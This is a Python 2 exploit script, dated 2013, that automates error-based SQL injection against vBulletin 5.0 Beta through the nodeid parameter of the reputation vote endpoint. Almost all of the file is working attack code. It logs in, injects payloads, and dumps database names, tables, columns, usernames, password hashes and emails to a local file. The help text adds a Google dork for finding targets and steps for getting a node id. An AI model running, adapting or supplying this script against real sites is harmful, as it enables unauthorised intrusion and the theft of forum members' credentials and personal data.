#!/usr/bin/python
# File : VBulletin 5.0 Beta Exploit
# 
# Date : 14.04.2013
#
# Vulnerability : Sql Injection
# Vulnerable Version : VBulletin 5.0 Beta ( All Upto Beta 28 )
# 
# Exploit Author : Shubham Raj (Xception Code)
# Facebook : http://www.facebook.com/xceptioncode
# Twitter : https://twitter.com/xceptioncode
#
# This is an exploit to automate process of exploiting Vbulletin 5.0 Beta
# With sql inection vulnerability.
# This vulnerability exists in almost all beta releases of Vbulletin 5.0 till date which is beta 28.
# 
# Vulnerability Discovered By 0x0A
# Exploit Coded By Shubham Raj
#
# Join Openfire-Security Forum : http://www.openfire-security.net/forum/
#
# Script Publicly released on 28.06.2013 In Openfire Security Forum
# link => http://forum.openfire-security.net/threads/vbulletin-5-0-automatic-injector-and-data-extractor-python-download-xception-code.12241/
# 
#
# Google Dork : Powered by vBulletin™ Version 5.0.0 Beta  etc etc (apply your brain)

import urllib2, sys, re, urllib, os
from cookielib import CookieJar

def use():
	print "[=] Usage : exploit.py SITE USERNAME PASSWORD NODEID OPTION(common/all)"
	print "[=] Example : www.host.com/forum/ xxxx xxxxx 124 common/all"
	print "\n[=] Or enter help to get described option, like exploit.py help"
	exit()
	
def help():
	print """
[=] Usage : exploit.py SITE USERNAME PASSWORD NODEID OPTION(common/all)
[=] Example : www.host.com/forum xxxx xxxxx 124 common/all

Options = common / all

common :
	If you will choose common as option,  you will get some basic extracted data from 
	given target like version, 
	current database name, current user name, first row from table user of current 
	database if exist.
	
all :
	if you will choose all as option, it will give you all info that you got in common 
	option along with :
	auto extraction of databases
	auto extraction of all datas from table user of current database if exist,
	extraction of tables of given database ( user input )
	extraction of columns of given database and table( user input )
	fetching data from give database -> table -> column
	Also, more control over the process and all.
		
All output automatically get saved to target(name).txt in current directory.
if file already exists, it starts appending output to existing file.
To use this exploit, first you must be registered to your target site.
Next, you should have a valid node id.	
	
SITE :
	site is your target site link followed with vbulletin path and a slash at end.

USERNAME :
	username is your username with which you have registered on target site
		
Password :	
	password is password for given username

NODE_ID :
	To get node id for your target site, follow these steps :
	1. login to your target using your credentials using mozilla firefox
	2. open any topic/thread on target
	3. open "LIVE HTTP HEADERS" in browser. You can install "LIVE HTTP HEADERS" 
	    from here : https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/
	    
	4. Install "LIVE HTTP HEADERS"
	5. On any topic/thread of target, click like button at below of the post.  
	    ( Image => http://s9.postimg.org/ij0gr72by/forum1.jpg )
	    
	6. Now, find up this link in "LIVE HTTP HEADERS" , link = target/ajax/api/reputation/vote  
	    ( Image => http://s12.postimg.org/492ph1y4t/forum2.png )
	    
	7. Now, click on replay button "LIVE HTTP HEADERS", and on send post content. 
	    You will get nodeid=value ( Image => http://s7.postimg.org/op271c116/forum3.jpg )
	    
	8. So, here value is node_id . Use value of node id to inject and exploit your target.

Exploit Information :

	Vulnerability : Sql Injection
	Vulnerable Version : VBulletin 5.0 Beta ( All Upto Beta 28 )

	Vulnerability Credit : 0x0A
	Contact : Not Available 

	Exploit Author : Xception Code
	Contact : http://www.facebook.com/xceptioncode

	This is an exploit to automate process of exploiting Vbulletin 5.0 Beta
	With sql injection vulnerability.
	This vulnerability exists in almost all beta releases of Vbulletin 5.0 till date which is beta 28.

	Vulnerability Discovered By 0x0A
	Exploit Coded By Xception Code
	"""	

try:
	print """\t\t\t
	\t\t__  __              _   _             
	\t\t\ \/ /___ ___ _ __ | |_(_) ___  _ __  
	\t\t \  // __/ _ \ '_ \| __| |/ _ \| '_ \ 
	\t\t /  \ (_|  __/ |_) | |_| | (_) | | | |
	\t\t/_/\_\___\___| .__/ \__|_|\___/|_| |_|
	\t\t             |_|                      
	\t\t   ___          _                     
	\t\t  / __\___   __| | ___                
	\t\t / /  / _ \ / _` |/ _ \               
	\t\t/ /__| (_) | (_| |  __/               
	\t\t\____/\___/ \__,_|\___|            
	\t\t\t\t\t VBulletin 5.0 Automated Injector.
	"""
    
        if sys.argv[1] == 'help':
		help()
        elif len(sys.argv) < 5: 
		use()
	else:
		pass
	
	
	host = sys.argv[1]
	username = sys.argv[2]
	password = sys.argv[3]
	node = sys.argv[4]
	opt = sys.argv[5]
	
	new_host = host.replace('.', '_')
	new_host1 = new_host.replace('http://', '')
	new_host2 = new_host1.replace('/', '')

	def common():
		cj = CookieJar()
		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

		formdata = { "url" : host, "username" : username, "password" : password }
		data_encoded = urllib.urlencode(formdata)
		print "\n[+] Logging in .. "
		print "[+] Username : " + username + ""
		print "[+] Password : " + password + ""
		print "[+] Node id : " + node + ""
		
				
		if os.path.exists(new_host2 + '.txt'):
			file = open(new_host2 + '.txt', "a")
		else:
			file = open(new_host2 + '.txt', "w")
		print "\n[+] Saving output to " + new_host2 + ".txt in current directory"
		file.write('\n[+] Site given to inect : ' + host + "\n")
		
		login_host = host + 'auth/login'
		response = opener.open(login_host, data_encoded)
	
		vote_host = host + 'ajax/api/reputation/vote'
	
		print "\n\t\t\t\t[=] Requesting datas... [=]\n"
		nagic = 'nodeid=' +  node + ') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(version() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] version : ' + result.group(1) + ""
		
		file.write('[+] version : ' + result.group(1) + "\n")
		
		
		nagic = 'nodeid=' + node +') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(database() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] Current Database : ' + result.group(1) + ""
		current_db = result.group(1)
		current_db = current_db.strip("'")
		
		
		file.write('[+] Current Database : ' + result.group(1) + "\n")
		
	
		nagic = 'nodeid=' + node + ') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(user() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] User : ' + result.group(1) + ""
		file.write('[+] User : ' + result.group(1) + "\n")

		nagic = 'nodeid=' + node + ') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(system_user() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] System User : ' + result.group(1) + ""
		file.write('[+] System User : ' + result.group(1) + "\n")
		
		print "\n[=] Trying to extract first row of table user from current database. To extract more go with all option! "
		file.write("\n[=] Trying to extract first row of table user from current database. To extract more go with all option! \n")
		
		
		try:
			ext = 'nodeid=' + node + ") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,username,0x7e,password,0x27,0x787e63) FROM " + current_db + "." + "user LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"

			response = opener.open(vote_host, ext)
			new = response.read()
			f = new
			result = re.search('x~c(.*)x~c', f)
			u_p = result.group(1)
			upwd = u_p.split('~')
			print '\n[+] username : Password  =>  ' + upwd[0] + " : " + upwd[1] 
			file.write('\n[+] username : Password  => ' + upwd[0] + " : " + upwd[1] + "\n")
		except KeyboardInterrupt:
			print "\n[=] Error in retriving datas from table 'user' of current db. "
			print "\n[-] Keyboard interrupted or ctrl+c pressed. Try again."	
		except:
			print "\n[=] Error in retriving datas from table 'user' of current db. "
			print "[=]  May be table user doesn't exist in current database.Try with option all."
		
		print "\n[+] You had choosed common option for extraction. Choose all for more options and extraction."
		print "\n[=>] Enjoy."
		
		file.write("\n[+] You had choosed common option for extraction. Choose all for more options and extraction.\n")
		file.write("\n[=>] Enjoy.")
		file.close()
		
	def all():
	
		cj = CookieJar()
		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

		formdata = { "url" : host, "username" : username, "password" : password }
		data_encoded = urllib.urlencode(formdata)
		print "\n[+] Logging in .. "
		print "[+] Username : " + username + ""
		print "[+] Password : " + password + ""
		print "[+] Node id : " + node + ""
		
				
		if os.path.exists(new_host2 + '.txt'):
			file = open(new_host2 + '.txt', "a")
		else:
			file = open(new_host2 + '.txt', "w")
		
		print "\n[+] Saving output to " + new_host2 + ".txt in current directory"
		
		file.write('\n[+] Site given to inect : ' + host + "\n")
		
		login_host = host + 'auth/login'
		response = opener.open(login_host, data_encoded)
	
		vote_host = host + 'ajax/api/reputation/vote'
	
		print "\n\t\t\t\t[=] Requesting datas... [=]\n"
		nagic = 'nodeid=' +  node + ') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(version() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] version : ' + result.group(1) + ""
		
		file.write('[+] version : ' + result.group(1) + "\n")
		
		
		nagic = 'nodeid=' + node +') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(database() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] Current Database : ' + result.group(1) + ""
		current_db = result.group(1)
		current_db = current_db.strip("'")
		
		
		file.write('[+] Current Database : ' + result.group(1) + "\n")
		
	
		nagic = 'nodeid=' + node + ') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(user() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] User : ' + result.group(1) + ""
		file.write('[+] User : ' + result.group(1) + "\n")

		nagic = 'nodeid=' + node + ') and(select 1 from(select count(*),concat((select (select concat(0x787e63,0x27,cast(system_user() as char),0x27,0x787e63)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
		response = opener.open(vote_host, nagic)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] System User : ' + result.group(1) + ""
		file.write('[+] System User : ' + result.group(1) + "\n")
		
		
		try:
			print "\n[=] Trying to extract first row of table user from current database."
			file.write("\n[=] Trying to extract first row of table user from current database. \n")
		
			ext = 'nodeid=' + node + ") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,username,0x7e,password,0x27,0x787e63) FROM " + current_db + "." + "user LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"
			response = opener.open(vote_host, ext)
			new = response.read()
			f = new
			result = re.search('x~c(.*)x~c', f)
			u_p = result.group(1)
			upwd = u_p.split('~')
			print '[+] username : Password =>  ' + upwd[0] + " : " + upwd[1] 
			file.write('\n[+] username : Password => ' + upwd[0] + " : " + upwd[1] + "\n")
		
		
			count = 'nodeid=' + node +") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,count(*),0x27,0x787e63) FROM user )) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"
			response = opener.open(vote_host, count)
			new = response.read()
			f = new
			result = re.search('x~c(.*)x~c', f)
			print '\n[+] Count of datas [table = user] : ' + result.group(1) + ""
			file.write('\n[+] Count of datas [table = user] : ' + result.group(1) + "\n")
			count = result.group(1)
			count = count.strip("'")
			count = int(count)
		
			option = raw_input("[=] Would you extract all datas of [Table = user] [Column = username,password,email] ? (yes/no) ")
			if option == 'yes':
				for a in range(0, count):
					db = 'nodeid=' + node + ") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,username,0x7e,password,0x27,0x787e63) FROM " + current_db + "." + "user LIMIT " + str(a) + ",1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"
					response = opener.open(vote_host, db)
					new = response.read()
					f = new
					result = re.search('x~c(.*)x~c', f)
					u_p = result.group(1)
					upwd = u_p.split('~')
					email = 'nodeid=' + node + ") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,email,0x27,0x787e63) FROM " + current_db + "." + "user LIMIT " + str(a) + ",1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"
					response = opener.open(vote_host, email)
					new = response.read()
					f = new
					result = re.search('x~c(.*)x~c', f)
					u_p = result.group(1)
					u_p = u_p.strip("'")
					print '\n[+] Username : Password : Email =>  ' + upwd[0] + " : " + upwd[1] + " : " + u_p
					file.write('\n[+] Username : Password : Email => ' + upwd[0] + " : " + upwd[1] + " : " + u_p + "\n")
			else:
				print "[=] Choosed not to extract data.. "
		except KeyboardInterrupt:
			print "\n[=] Error in retriving datas from table 'user' of current db. "
			print "\n[-] Keyboard interrupted or ctrl+c pressed. Try again."		
		except:
			print "\n[=] Error in retriving datas from table 'user' of current db. "
			print "[=] May be table user doesn't exist in current database.Try going through option fetching datas.\n"

		vote_host = host + 'ajax/api/reputation/vote'
		
		count = 'nodeid=' + node +') and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x787e63,0x27,count(schema_name),0x27,0x787e63) FROM information_schema.schemata )) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'

		response = opener.open(vote_host, count)
		new = response.read()
		f = new
		result = re.search('x~c(.*)x~c', f)
		print '[+] Count Of Databases : ' + result.group(1) + ""
		file.write('[+] Count Of Databases : ' + result.group(1) + "\n")
		count = result.group(1)
		count = count.strip("'")
		count = int(count)
		print "\n[=] Extracting all databases..."
		for c in range(0, count):
			db = 'nodeid=' + node + ') and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x787e63,0x27,cast(schema_name as char),0x27,0x787e63) FROM information_schema.schemata LIMIT ' + str(c) + ',1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x'
			response = opener.open(vote_host, db)
			new = response.read()
			f = new
			result = re.search('x~c(.*)x~c', f)
			if result == None:
				exit
			else:
				print '[+] Database [%s] : ' % c + result.group(1) + ""
				file.write('[+] Database [%s] : ' % c + result.group(1) + "\n")
		option = raw_input("\n[=] Would you like to extract databases tables ? (yes/no) ")
		if option == 'yes':
			print "[+] Choosed to extract database tables too. "
			dbs = raw_input("[=] Enter database name to extract tables : " )
			count = 'nodeid=' + node +") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,count(table_name),0x27,0x787e63) FROM `information_schema`.tables WHERE table_schema='" + dbs + "')) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"

			response = opener.open(vote_host, count)
			new = response.read()
			f = new
			result = re.search('x~c(.*)x~c', f)
			print '\n[+] Count of table where [database = %s] : ' % dbs + result.group(1) + ""
			file.write('\n[+] Count of table where [database = %s] : ' % dbs + result.group(1) + "\n")
			count = result.group(1)
			count = count.strip("'")
			count = int(count)
			print "\n[=] Extracting all tables..."
			for c in range(0, count):
				db = 'nodeid=' + node + ") and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x787e63,0x27,cast(table_name as char),0x27,0x787e63) FROM information_schema.tables Where table_schema='" + dbs + "' LIMIT " + str(c) + ",1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"
				response = opener.open(vote_host, db)
				new = response.read()
				f = new
				result = re.search('x~c(.*)x~c', f)
				if result.group(1) == None:
					print "[=] Error in retrieving datas or you entered a wrong database name "
					exit
				else:
					print '[+] Table [%s] [%s] : ' % (dbs, c) + result.group(1) + ""
					file.write('[+] Table [%s] [%s] : ' % (dbs, c) + result.group(1) + "\n")
		elif option == 'no':
			print "[=] You choosed not to extract tables."
		else:
			print "[=] Invalid Option. Exiting.. "
			exit()
		option_column = raw_input("\n[=] Would you like to extract columns ? {yes/no) ")
		if option_column == 'yes':
			print "[+] Choosed to extract columns too"
			dbs = raw_input("[=] Enter database name to extract columns : " )
			table = raw_input("[=] Enter table name to extract columns : " )
			
			count = 'nodeid=' + node +") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,count(column_name),0x27,0x787e63) FROM `information_schema`.columns WHERE table_schema='" + dbs + "' AND table_name='" + table + "')) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"

			response = opener.open(vote_host, count)
			new = response.read()
			f = new
			result = re.search('x~c(.*)x~c', f)
			print '\n[+] Count of column where [database = %s] [table = %s] : ' % (dbs, table) + result.group(1) + ""
			file.write('\n[+] Count of column where [database = %s] [table = %s] : ' % (dbs, table) + result.group(1) + "\n")
			count = result.group(1)
			count = count.strip("'")
			count = int(count)
			print "\n[=] Extracting all columns..."
			for c in range(0, count):
				db = 'nodeid=' + node + ") and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x787e63,0x27,cast(column_name as char),0x27,0x787e63) FROM `information_schema`.columns WHERE table_schema='" + dbs + "' AND table_name='" + table + "' LIMIT " + str(c) +",1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=s"

				response = opener.open(vote_host, db)
				new = response.read()
				f = new
				result = re.search('x~c(.*)x~c', f)
				if result.group(1) == None:
					print "[=] Error in retrieving datas or you entered a wrong database or table name "
					exit
				else:
					print '[+] Column [%s] [%s] [%s] : ' % (dbs, table, c) + result.group(1) + ""
					file.write('[+] Column [%s] [%s] [%s] : ' % (dbs, table, c) + result.group(1) + "\n")
		elif option == 'no':
			print "[=] You choosed not to extract tables."
		else:
			print "[=] Invalid Option. "
			
		option_column = raw_input("\n[=] Would you like to fetch datas ? {yes/no) ")
		
		if option_column == 'yes':
			print "[+] Choosed to fetch datas too"
			dbs = raw_input("[=] Enter database name  : " )
			table = raw_input("[=] Enter table name  : " )
			column = raw_input("[=] Enter column name : ")
			
			
			print "[=] Counting data of given column .. "
			count = 'nodeid=' + node +") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27,count(*),0x27,0x787e63) FROM " + dbs + "." + table + " )) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"

			response = opener.open(vote_host, count)
			new = response.read()
			f = new
			result = re.search('x~c(.*)x~c', f)
			print '\n[+] Count of datas where [database = %s] [table = %s] : ' % (dbs, table) + result.group(1) + ""
			file.write('\n[+] Count of datas where [database = %s] [table = %s] : ' % (dbs, table) + result.group(1) + "\n")
			count = result.group(1)
			count = count.strip("'")
			count = int(count)
			print "\n[=] Extracting all datas of given column..."
			for c in range(0, count):
				db = 'nodeid=' + node + ") and(select 1 from(select count(*),concat((select (select (SELECT concat(0x787e63,0x27," + column + ",0x27,0x787e63) FROM " + dbs + "." + table + " LIMIT " + str(c) + ",1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (x=x"

				response = opener.open(vote_host, db)
				new = response.read()
				f = new
				result = re.search('x~c(.*)x~c', f)
				if result.group(1) == None:
					print "[=] Error in retrieving datas or you entered a wrong database or table name "
					exit
				else:
					print '[+] Column [%s] [%s] [%s] [%s] : ' % (dbs, table, column, c) + result.group(1) + ""
					file.write('[+] Column [%s] [%s] [%s] [%s] : ' % (dbs, table, column, c) + result.group(1) + "\n")
			
		elif option == 'no':
			print "[=] You choosed not to extract datas. Exiting.."
			file.close()
			exit()
		else:
			print "[=] Invalid Option. Exiting.. "
			file.close()
			exit()
			
		
	if opt == 'all':
		all()
	elif opt == 'common':
		common()
		
except KeyboardInterrupt:
	print "\n[-] Keyboard interrupted or ctrl+c pressed. Try again."
except Exception as e:
	print "\n[-] Error Occured. Try again. "
	print "\n[=] Enter 'help' to get help. Example : exploit.py help"
	
